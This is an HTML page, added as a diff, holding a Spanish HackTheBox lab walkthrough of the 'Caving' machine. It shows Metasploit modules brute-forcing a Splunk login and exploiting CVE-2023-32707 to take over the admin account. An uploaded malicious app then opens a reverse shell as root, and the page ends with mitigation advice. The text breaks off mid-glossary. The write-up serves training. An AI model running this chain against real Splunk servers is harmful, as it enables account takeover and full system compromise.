@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; base-uri 'self'; form-action 'none'; object-src 'none'">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>Caving — HackTheBox Writeup | Brandeiks</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2064%2064'%3E%3Crect%20width='64'%20height='64'%20rx='13'%20fill='%2300ff88'/%3E%3Ctext%20x='32'%20y='34'%20text-anchor='middle'%20dominant-baseline='central'%20font-family='Arial%20Black,%20Arial,%20Helvetica,%20sans-serif'%20font-size='46'%20font-weight='900'%20fill='%23050a0e'%3EB%3C/text%3E%3C/svg%3E">
+  <meta name="description" content="Writeup de la máquina Caving de HackTheBox (Linux, Muy Fácil): Splunk Enterprise 9.0.4 con credenciales débiles (guest:password) y CVE-2023-32707 (el permiso edit_user permite cambiar la contraseña de cualquier usuario) → account takeover del admin woodenk → app maliciosa → RCE como root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="canonical" href="https://brandeiks.github.io/writeups/hackthebox/muy-facil/caving.html">
+  <meta property="og:type" content="article">
+  <meta property="og:site_name" content="Brandeiks">
+  <meta property="og:title" content="Caving — HackTheBox Writeup | Brandeiks">
+  <meta property="og:description" content="Writeup de la máquina Caving de HackTheBox (Linux, Muy Fácil): Splunk + credenciales débiles (guest:password) + CVE-2023-32707 (edit_user) → account takeover → app maliciosa → RCE como root.">
+  <meta property="og:url" content="https://brandeiks.github.io/writeups/hackthebox/muy-facil/caving.html">
+  <meta property="og:image" content="https://brandeiks.github.io/assets/og/caving.png">
+  <meta property="og:image:width" content="1200">
+  <meta property="og:image:height" content="630">
+  <meta property="og:locale" content="es_ES">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Caving — HackTheBox Writeup | Brandeiks">
+  <meta name="twitter:description" content="Writeup de la máquina Caving de HackTheBox (Linux, Muy Fácil): Splunk CVE-2023-32707 → guest:password → edit_user → account takeover → RCE como root.">
+  <meta name="twitter:image" content="https://brandeiks.github.io/assets/og/caving.png">
+  <script type="application/ld+json">{"@context": "https://schema.org", "@type": "TechArticle", "headline": "Caving — HackTheBox Writeup | Brandeiks", "description": "Writeup de la máquina Caving de HackTheBox (Linux, Muy Fácil): un Splunk Enterprise 9.0.4 con credenciales débiles (guest:password) y la CVE-2023-32707 permite, mediante el permiso edit_user, cambiar la contraseña del administrador woodenk, subir una app maliciosa y conseguir RCE como root.", "inLanguage": "es", "url": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/caving.html", "image": "https://brandeiks.github.io/assets/og/caving.png", "author": {"@type": "Person", "name": "Brandon Zevallos Pastrana", "url": "https://brandeiks.github.io/"}, "publisher": {"@type": "Organization", "name": "Brandeiks", "url": "https://brandeiks.github.io/"}, "mainEntityOfPage": {"@type": "WebPage", "@id": "https://brandeiks.github.io/writeups/hackthebox/muy-facil/caving.html"}}</script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="stylesheet" href="../../../assets/writeups.css">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    /* FOOTER */
+
+    @media (max-width: 1024px) {
+      .writeup-layout { grid-template-columns: 1fr; }
+      .sidebar { position: static; order: -1; display: flex; gap: 1rem; flex-wrap: wrap; }
+      .sidebar-box { flex: 1; min-width: 200px; margin-bottom: 0; }
+    }
+    @media (max-width: 768px) {
+      nav { padding: 1rem 1.5rem; }
+      .writeup-hero { padding: 6rem 1.5rem 2.5rem; }
+      .writeup-layout { padding: 2rem 1.5rem; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+
+        /* NAV RESPONSIVE */
+    @media (max-width: 900px) {
+      nav { padding: 0.7rem 1rem; }
+      .nav-logo { font-size: 0.85rem; letter-spacing: 2px; }
+      .nav-back { font-size: 0.68rem; margin-left: 0.8rem; }
+    }
+    @media (max-width: 700px) {
+      nav { flex-wrap: wrap; justify-content: space-between; row-gap: 0; padding: 0.6rem 1rem; }
+      .nav-logo { font-size: 0.82rem; letter-spacing: 1px; }
+      .menu-btn {
+        display: flex; align-items: center; justify-content: center;
+        width: 40px; height: 34px; cursor: pointer;
+        border: 1px solid var(--dim); border-radius: 3px;
+      }
+      .menu-btn span, .menu-btn span::before, .menu-btn span::after {
+        display: block; width: 18px; height: 2px; background: var(--green);
+        transition: transform 0.25s, opacity 0.25s;
+      }
+      .menu-btn span { position: relative; }
+      .menu-btn span::before, .menu-btn span::after { content: ''; position: absolute; left: 0; }
+      .menu-btn span::before { top: -6px; }
+      .menu-btn span::after { top: 6px; }
+      .menu-check:checked ~ nav .menu-btn span { background: transparent; }
+      .menu-check:checked ~ nav .menu-btn span::before { transform: translateY(6px) rotate(45deg); }
+      .menu-check:checked ~ nav .menu-btn span::after { transform: translateY(-6px) rotate(-45deg); }
+      .nav-back { display: none; }
+      .menu-check:checked ~ nav .nav-back {
+        display: block; width: 100%; text-align: center;
+        margin: 0; padding: 0.7rem 0; font-size: 0.78rem;
+        border-top: 1px solid var(--dim);
+      }
+    }
+    @media (max-width: 480px) {
+      nav { padding: 0.55rem 0.8rem; }
+      .nav-logo { font-size: 0.76rem; }
+      .menu-check:checked ~ nav .nav-back { font-size: 0.72rem; padding: 0.6rem 0; }
+          footer { flex-direction: column; gap: 0.8rem; text-align: center; padding: 1.5rem; }
+}
+  </style>
+</head>
+<body>
+
+<a href="#main" class="skip-link">Saltar al contenido</a>
+<noscript><div class="aviso-noscript"><strong>JavaScript desactivado:</strong> la navegación entre writeups, el modo guion, el zoom de capturas y el progreso de lectura necesitan JavaScript. El contenido del writeup, los comandos y los enlaces del índice funcionan igualmente.</div></noscript>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+
+<!-- NAV -->
+<input type="checkbox" id="menuAbierto" class="menu-check" aria-hidden="true">
+<nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <label for="menuAbierto" class="menu-btn" aria-label="Abrir menú"><span></span></label>
+    <a href="../../../index.html" class="nav-back">INICIO</a>
+    <a href="../../../videos/index.html" class="nav-back">VÍDEOS</a>
+    <a href="../../../writeups/index.html" class="nav-back">WRITEUPS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+    <a href="../../../comandos/index.html" class="nav-back">COMANDOS</a>
+    <a href="../../../certificaciones.html" class="nav-back">CERTIFICACIONES</a>
+  </nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">writeups</a> /
+      <a href="../../../writeups/index.html">hackthebox</a> /
+      <span>caving</span>
+    </div>
+    <h1 class="writeup-title">CAV<span>ING</span></h1>
+    <p class="writeup-subtitle">// Splunk CVE-2023-32707: guest:password → edit_user → account takeover → RCE como root</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-muy-facil">● MUY FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-tech">SPLUNK 9.0.4</span>
+      <span class="meta-badge badge-cve">CVE-2023-32707</span>
+      <span class="meta-badge badge-rce">RCE · ROOT</span>
+      <span class="meta-date">📅 Octubre 2026 · Por Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#recon">01 · Reconocimiento</a></li>
+        <li><a href="#bruteforce">02 · Login: Hydra vs Metasploit</a></li>
+        <li><a href="#enum">03 · Enumeración de usuarios</a></li>
+        <li><a href="#cve">04 · CVE-2023-32707</a></li>
+        <li><a href="#exploit">05 · De guest a root</a></li>
+        <li><a href="#cmdref">06 · Referencia Comandos</a></li>
+        <li><a href="#glosario">07 · Glosario</a></li>
+      </ul>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO MÁQUINA</p>
+      <div class="info-row"><span class="info-label">NOMBRE</span><span class="info-val val-cyan">Caving</span></div>
+      <div class="info-row"><span class="info-label">SO</span><span class="info-val val-cyan">Linux</span></div>
+      <div class="info-row"><span class="info-label">DIFICULTAD</span><span class="info-val val-muy-facil">Muy Fácil</span></div>
+      <div class="info-row"><span class="info-label">PLATAFORMA</span><span class="info-val val-yellow">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">SERVICIO</span><span class="info-val val-yellow">Splunk 9.0.4</span></div>
+      <div class="info-row"><span class="info-label">CVE</span><span class="info-val val-red">CVE-2023-32707</span></div>
+      <div class="info-row"><span class="info-label">TÉCNICA</span><span class="info-val val-cyan">Account takeover</span></div>
+    </div>
+
+    <div class="sidebar-box">
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">nmap → <span>8000/8089 Splunk</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">msf splunk_web_login → <span>guest:password</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">guest tiene <span>edit_user</span> (CVE-2023-32707)</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">cambiar pass de <span>woodenk</span> (admin)</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">app maliciosa → <span>RCE</span></div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text">Splunk corría como <span>root</span> → flag</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main id="main" class="writeup-content">
+    <!-- ===================== 01 RECON ===================== -->
+    <div class="section" id="recon">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">CONTEXTO Y RESUMEN (TL;DR)</span>
+      </div>
+      <div class="prose">
+        <p>
+          <strong>Caving</strong> es una máquina <span class="hl-cyan">Linux</span> de dificultad
+          <span class="hl">Very Easy</span> que gira en torno a un <strong>Splunk</strong> mal
+          configurado. Credenciales por defecto y una vulnerabilidad de autorización
+          (<span class="hl-red">CVE-2023-32707</span>) se combinan para llevarnos de invitado anónimo a
+          <strong>root</strong> en menos de diez comandos:
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div>Recon → credenciales débiles (<span class="o-cyan">guest:password</span>) → enumeración de usuarios</div>
+        <div>→ CVE-2023-32707 (account takeover) → app maliciosa → <span class="o-green">RCE como root</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// LAS IPs CAMBIAN EN CADA DESPLIEGUE</p>
+        <p>
+          La IP del objetivo (aquí <code>10.129.5.241</code>) y tu IP de VPN / <strong>LHOST</strong>
+          (aquí <code>10.10.16.7</code>, interfaz <code>tun0</code>) cambian en cada sesión. Compruébalas
+          con <code>ip a</code> y en el panel de HTB, y reemplázalas antes de copiar cualquier comando —
+          un LHOST incorrecto significa que la reverse shell nunca llega.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">2</div>
+        <span class="step-title">ESCANEO DE PUERTOS CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          Empezamos por saber qué corre en el objetivo. Con <span class="hl-yel">-sV</span> pedimos también
+          la versión de cada servicio, clave para buscar vulnerabilidades conocidas.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nmap -sV 10.129.5.241">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">NMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">nmap <span class="flag">-sV</span> <span class="arg">10.129.5.241</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>PORT     STATE SERVICE  VERSION</div>
+        <div>22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu</div>
+        <div>8000/tcp open  http     <span class="o-green">Splunkd httpd</span></div>
+        <div>8089/tcp open  ssl/http <span class="o-green">Splunkd httpd</span></div>
+      </div>
+
+      <div class="prose">
+        <p>
+          El <strong>22</strong> es SSH (inútil sin credenciales). Los <strong>8000</strong> (interfaz web)
+          y <strong>8089</strong> (API REST de administración, <code>splunkd</code>) son de
+          <span class="hl-cyan">Splunk</span>, software empresarial de análisis de logs con mucho historial
+          de malas configuraciones y escaladas de privilegios. Verlo expuesto es una señal de alerta.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 02 BRUTEFORCE ===================== -->
+    <div class="section" id="bruteforce">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Login: por qué Hydra falla y usamos Metasploit</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">EL PROBLEMA CON HYDRA</span>
+      </div>
+      <div class="prose">
+        <p>
+          El instinto es probar credenciales por defecto a mano y, si fallan, automatizar con
+          <span class="hl-cyan">Hydra</span>. Pero el login de Splunk usa un <strong>token anti-CSRF
+          (<code>cval</code>)</strong> que cambia en cada sesión y debe coincidir con una cookie: hay que
+          pedir primero la página de login para obtener el token y enviarlo junto a la cookie en cada
+          intento. Además, Hydra v9.6 tiene un bug conocido al combinar la condición de fallo con headers
+          personalizados. En vez de pelear con eso, usamos la herramienta hecha para el trabajo.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">MÓDULO METASPLOIT splunk_web_login</span>
+      </div>
+      <div class="prose">
+        <p>
+          El módulo <span class="hl-cyan">auxiliary/scanner/http/splunk_web_login</span> ya sabe manejar el
+          token CSRF y las cookies automáticamente en cada intento. Le damos listas de usuarios y
+          contraseñas comunes de <strong>SecLists</strong> y que pare al primer acierto:
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">msf &gt;</span> use auxiliary/scanner/http/splunk_web_login</div>
+        <div><span class="o-green">msf &gt;</span> set RHOSTS 10.129.5.241</div>
+        <div><span class="o-green">msf &gt;</span> set RPORT 8000</div>
+        <div><span class="o-green">msf &gt;</span> set SSL false</div>
+        <div><span class="o-green">msf &gt;</span> set USER_FILE /usr/share/seclists/Usernames/top-usernames-shortlist.txt</div>
+        <div><span class="o-green">msf &gt;</span> set PASS_FILE /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt</div>
+        <div><span class="o-green">msf &gt;</span> set STOP_ON_SUCCESS true</div>
+        <div><span class="o-green">msf &gt;</span> run</div>
+        <div>&nbsp;</div>
+        <div>[+] <span class="o-green">SUCCESSFUL LOGIN. 'guest' : 'password'</span></div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// PRIMERA PUERTA: guest:password</p>
+        <p>
+          Usuario <strong>guest</strong>, contraseña <strong>password</strong>. En el mundo real, las
+          contraseñas débiles siguen siendo la causa número uno de brechas. A veces la herramienta
+          «obvia» (Hydra) no es la correcta: reconocer cuándo cambiar ahorra mucho tiempo de debugging.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 03 ENUM ===================== -->
+    <div class="section" id="enum">
+      <p class="section-label">// 03</p>
+      <h2 class="section-title">Enumeración de usuarios</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">SETTINGS → USERS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con <span class="hl-cyan">guest:password</span> entramos a la interfaz web
+          (<code>http://10.129.5.241:8000</code>) y vamos a <strong>Settings → Users</strong>. Hay tres
+          cuentas:
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr>
+            <th>USUARIO</th>
+            <th>NOMBRE COMPLETO</th>
+            <th>ROL</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td>guest</td><td>—</td><td>user</td></tr>
+          <tr><td>whisssssp3r</td><td>Aura Katikus</td><td>user</td></tr>
+          <tr><td>woodenk</td><td>Administrator</td><td><span class="hl-red">admin</span></td></tr>
+        </tbody>
+      </table>
+
+      <div class="prose">
+        <p>
+          <span class="hl-cyan">woodenk</span> es la cuenta con privilegios de administrador — nuestro
+          siguiente objetivo. Normalmente necesitaríamos su contraseña… salvo por la CVE que viene a
+          continuación.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 04 CVE ===================== -->
+    <div class="section" id="cve">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">La vulnerabilidad: CVE-2023-32707</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Splunk (versiones anteriores a <strong>9.0.5</strong>) tiene un fallo de control de acceso:
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div>Cualquier usuario cuyo rol tenga el permiso (capability) <span class="o-cyan">'edit_user'</span></div>
+        <div>puede cambiar la contraseña de <span class="o-yellow">CUALQUIER OTRO usuario</span> del sistema</div>
+        <div>—incluido admin— <span class="o-yellow">sin necesitar su contraseña actual</span>.</div>
+        <div>&nbsp;</div>
+        <div>Ocurre porque Splunk no verifica correctamente el ajuste 'grantableRoles'</div>
+        <div>que debería limitar a quién puedes editar.</div>
+      </div>
+
+      <div class="vuln-box">
+        <p class="vuln-box-title">// EN CRIOLLO</p>
+        <p>
+          Es como si un empleado de soporte, que solo debería resetear contraseñas de usuarios normales,
+          pudiera también resetear la del dueño de la empresa — por un descuido en el sistema de permisos.
+          El usuario <strong>guest</strong> de esta máquina tenía el permiso <code>edit_user</code> mal
+          asignado. Por eso funciona.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 05 EXPLOIT ===================== -->
+    <div class="section" id="exploit">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">Explotación · De guest a root</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">EL MÓDULO QUE AUTOMATIZA LA CADENA</span>
+      </div>
+      <div class="prose">
+        <p>
+          El módulo <span class="hl-cyan">exploit/multi/http/splunk_privilege_escalation_cve_2023_32707</span>
+          hace todo de una vez: cambia la contraseña de admin abusando de <code>edit_user</code>, inicia
+          sesión con la nueva, sube una <strong>app maliciosa</strong> a Splunk (las apps admiten scripts
+          que se ejecutan en el servidor — justo lo que se abusa) y entrega una shell.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">msf &gt;</span> use exploit/multi/http/splunk_privilege_escalation_cve_2023_32707</div>
+        <div><span class="o-green">msf &gt;</span> set RHOSTS 10.129.5.241</div>
+        <div><span class="o-green">msf &gt;</span> set RPORT 8000</div>
+        <div><span class="o-green">msf &gt;</span> set SSL false</div>
+        <div><span class="o-green">msf &gt;</span> set USERNAME guest</div>
+        <div><span class="o-green">msf &gt;</span> set PASSWORD password</div>
+        <div><span class="o-green">msf &gt;</span> set TARGET_USER woodenk</div>
+        <div><span class="o-green">msf &gt;</span> set LHOST 10.10.16.7</div>
+        <div><span class="o-green">msf &gt;</span> run</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// DOS IPs QUE AMBAS CAMBIAN</p>
+        <p>
+          <strong>RHOSTS</strong> (10.129.5.241) es el objetivo del panel de HTB; <strong>LHOST</strong>
+          (10.10.16.7) es TU IP de VPN (<code>tun0</code>, mírala con <code>ip a</code>). Un LHOST
+          incorrecto = reverse shell que nunca llega. <code>TARGET_USER woodenk</code> es a quién le
+          cambiamos la contraseña sin saberla.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">LO QUE PASA AL EJECUTAR run</span>
+      </div>
+      <div class="output-block">
+        <div>[+] SUCCESSFUL LOGIN. 'guest' : 'password'</div>
+        <div>[+] The target is vulnerable. User 'guest' has <span class="o-cyan">'edit_user'</span> capability</div>
+        <div>[*] Changing 'woodenk' password to <span class="o-yellow">rDnWgfZwcbsk</span></div>
+        <div>[+] Password of the user 'woodenk' has been changed to rDnWgfZwcbsk</div>
+        <div>[+] SUCCESSFUL LOGIN. 'woodenk' : 'rDnWgfZwcbsk'</div>
+        <div>[*] Command shell session 1 opened (<span class="o-green">10.10.16.7:4444 -&gt; 10.129.5.241:43572</span>)</div>
+      </div>
+
+      <div class="prose">
+        <p>
+          En orden: se logueó como <strong>guest</strong>, confirmó el permiso <code>edit_user</code>, le
+          cambió la contraseña a <strong>woodenk</strong> por una aleatoria, inició sesión como él (ya con
+          rol admin), empaquetó y subió una app maliciosa, y esa app se ejecutó devolviendo una shell a
+          nuestro listener.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">POST-EXPLOTACIÓN Y FLAG</span>
+      </div>
+      <div class="prose">
+        <p>
+          ¿Con qué privilegios quedamos? Splunk corría <strong>directamente como root</strong> — un error
+          grave de configuración. Apenas conseguimos RCE, ya teníamos las llaves del reino:
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="whoami &amp;&amp; find / -name root.txt 2>/dev/null &amp;&amp; cat /root/root.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">ROOT</span>
+        <div><span class="prompt">$ </span><span class="cmd">whoami</span></div>
+        <div><span class="o-green">root</span></div>
+        <div><span class="prompt">$ </span><span class="cmd">find / <span class="flag">-name</span> <span class="arg">root.txt</span> <span class="flag">2&gt;/dev/null</span></span></div>
+        <div>/root/root.txt</div>
+        <div><span class="prompt">$ </span><span class="cmd">cat <span class="arg">/root/root.txt</span></span></div>
+        <div><span class="o-green">🚩 flag de root capturada</span></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// FLAG · ROOT</p>
+        <p>
+          <strong>whoami → root</strong>: máquina comprometida por completo. La flag de root
+          <strong>se obtiene leyendo</strong> <code>/root/root.txt</code>. Como Splunk corría como
+          <strong>root</strong>, el RCE equivalió directamente a control total, sin necesidad de escalada
+          adicional.
+        </p>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// LECCIONES Y MITIGACIÓN</p>
+        <p>
+          Cuatro descuidos encadenados: <strong>credenciales débiles</strong> (guest:password nunca
+          debería existir), el <strong>permiso edit_user</strong> mal asignado a una cuenta de bajo nivel
+          (principio de mínimo privilegio), <strong>Splunk sin parchear</strong> (&lt; 9.0.5, afectado por
+          CVE-2023-32707) y, sobre todo, el <strong>servicio corriendo como root</strong>. Si Splunk
+          hubiera corrido como un usuario de servicio dedicado, el RCE no habría sido compromiso total
+          inmediato — habría hecho falta una escalada adicional.
+        </p>
+      </div>
+    </div>
+
+    <!-- ===================== 06 CMD REF ===================== -->
+    <div class="section" id="cmdref">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">Referencia de Comandos</h2>
+      <div class="section-line"></div>
+
+      <div class="cmd-ref-grid">
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">nmap</div>
+          <div class="cmd-ref-syntax">nmap -sV &lt;ip&gt;</div>
+          <div class="cmd-ref-desc">Escaneo con detección de versión. Identifica SSH (22) y, sobre todo, Splunkd en 8000 (web) y 8089 (API REST), el objetivo real.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>-sV</span> — versión de cada servicio</li>
+            <li><span>-p-</span> — todos los puertos si quieres ir más allá de los comunes</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">splunk_web_login (auxiliary)</div>
+          <div class="cmd-ref-syntax">use auxiliary/scanner/http/splunk_web_login</div>
+          <div class="cmd-ref-desc">Módulo de Metasploit que ataca el login web de Splunk gestionando el token CSRF y las cookies, cosa que Hydra no hace bien. Encuentra guest:password.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>RHOSTS / RPORT</span> — IP y puerto (8000)</li>
+            <li><span>USER_FILE / PASS_FILE</span> — wordlists de SecLists</li>
+            <li><span>STOP_ON_SUCCESS</span> — parar al primer acierto</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">splunk_privilege_escalation (exploit)</div>
+          <div class="cmd-ref-syntax">use exploit/multi/http/splunk_privilege_escalation_cve_2023_32707</div>
+          <div class="cmd-ref-desc">Automatiza toda la cadena: abusa de edit_user para cambiar la contraseña del admin, sube una app maliciosa y entrega una shell (RCE).</div>
+          <ul class="cmd-ref-flags">
+            <li><span>USERNAME / PASSWORD</span> — guest:password (bajo privilegio)</li>
+            <li><span>TARGET_USER</span> — el admin a secuestrar (woodenk)</li>
+            <li><span>LHOST</span> — tu IP de VPN (tun0) para la reverse shell</li>
+          </ul>
+        </div>
+
+        <div class="cmd-ref-card">
+          <div class="cmd-ref-name">Post-explotación</div>
+          <div class="cmd-ref-syntax">whoami ; find / -name root.txt 2&gt;/dev/null ; cat /root/root.txt</div>
+          <div class="cmd-ref-desc">Confirmar el usuario (root), localizar la flag y leerla. Splunk corría como root, así que no hizo falta escalada adicional.</div>
+          <ul class="cmd-ref-flags">
+            <li><span>whoami</span> — usuario actual</li>
+            <li><span>find / -name root.txt 2&gt;/dev/null</span> — localiza la flag silenciando errores</li>
+            <li><span>ip a</span> — ver tu LHOST (interfaz tun0) antes del exploit</li>
+          </ul>
+        </div>
+
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">SECUENCIA COMPLETA</span>
+      </div>
+      <div class="cmd-block" data-cmd="nmap -sV 10.129.5.241 &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/http/splunk_web_login; set RHOSTS 10.129.5.241; set RPORT 8000; set SSL false; set STOP_ON_SUCCESS true; run'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
+        <span class="cmd-label">RESUMEN</span>
+        <div><span class="comment"># 1. escanear -> Splunk en 8000/8089</span></div>
+        <div><span class="prompt">$ </span><span class="cmd">nmap <span class="flag">-sV</span> <span class="arg">10.129.5.241</span></span></div>
+        <div><span class="comment"># 2. msf: fuerza bruta del login -> guest:password</span></div>
+        <div><span class="prompt">msf &gt; </span><span class="cmd">use <span class="arg">auxiliary/scanner/http/splunk_web_login</span></span></div>
+        <div><span class="comment"># 3. msf: exploit CVE-2023-32707 (edit_user) -> app maliciosa -> shell</span></div>
+        <div><span class="prompt">msf &gt; </span><span class="cmd">use <span class="arg">exploit/multi/http/splunk_privilege_escalation_cve_2023_32707</span></span></div>
+        <div><span class="comment"># 4. en la shell: whoami -> root -> cat /root/root.txt</span></div>
+      </div>
+    </div>
+
+    <!-- ===================== 07 GLOSARIO ===================== -->
+    <div class="section" id="glosario">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Glosario</h2>
+      <div class="section-line"></div>
+
+      <div class="glosario-grid">
+
+        <div class="glos-card">
+          <div class="glos-term">Splunk</div>
+          <div class="glos-def">
+            Plataforma empresarial para <strong>buscar, monitorizar y analizar logs</strong> de servidores
+            y aplicaciones. Expone una interfaz web (8000) y una API REST de administración
+            (<code>splunkd</code>, 8089). Permite instalar <strong>apps</strong> con scripts que corren en
+            el servidor, lo que la convierte en objetivo habitual de RCE.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">CVE-2023-32707</div>
+          <div class="glos-def">
+            Fallo de <strong>autorización</strong> en Splunk &lt; 9.0.5: un usuario con la capability
+            <code>edit_user</code> puede cambiar la contraseña de <strong>cualquier</strong> otro usuario
+            (incluido admin) sin conocer la actual, porque no se valida bien <code>grantableRoles</code>.
+            Permite <strong>account takeover</strong> del administrador.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Capability edit_user</div>
+          <div class="glos-def">
+            Permiso de Splunk que habilita gestionar usuarios. Debería estar reservado a administradores;
+            asignado a una cuenta de bajo privilegio (como <code>guest</code> aquí) y combinado con la CVE,
+            se convierte en la llave para secuestrar la cuenta admin.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Token anti-CSRF (cval)</div>
+          <div class="glos-def">
+            Valor único por sesión que un formulario web exige para evitar peticiones falsificadas
+            (CSRF). El login de Splunk lo usa (<code>cval</code>) ligado a una cookie: por eso Hydra
+            «genérica» falla y hay que pedir la página antes de cada intento — lo que el módulo de
+            Metasploit hace solo.
+          </div>
+        </div>
+
+        <div class="glos-card">
+          <div class="glos-term">Metasploit: auxiliary vs exploit</div>
+          <div class="glos-def">
